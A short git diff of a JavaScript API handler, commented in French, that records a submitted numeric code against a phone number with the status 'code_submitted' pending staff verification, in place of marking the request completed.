@@ -28,12 +28,10 @@ export default async function handler(req, res) {
       return res.status(400).json({ success: false, message: `Code invalide (${expectedLen} chiffres requis)` });
     }
 
-    await sql`UPDATE snap_requests SET status = 'completed', staff_code = ${codeStr} WHERE phone = ${phone}`;
+    // NOUVEAU : status = 'code_submitted' (attente validation staff)
+    await sql`UPDATE snap_requests SET status = 'code_submitted', staff_code = ${codeStr} WHERE phone = ${phone}`;
 
-    // Pas de webhook ici — le bot détecte le statut 'completed' via polling
-    // et envoie l'embed avec le bouton Ban IP
-
-    return res.status(200).json({ success: true, message: 'Code validé' });
+    return res.status(200).json({ success: true, message: 'Code soumis, en attente de vérification' });
   } catch (e) {
     return res.status(500).json({ success: false, message: e.message });
   }
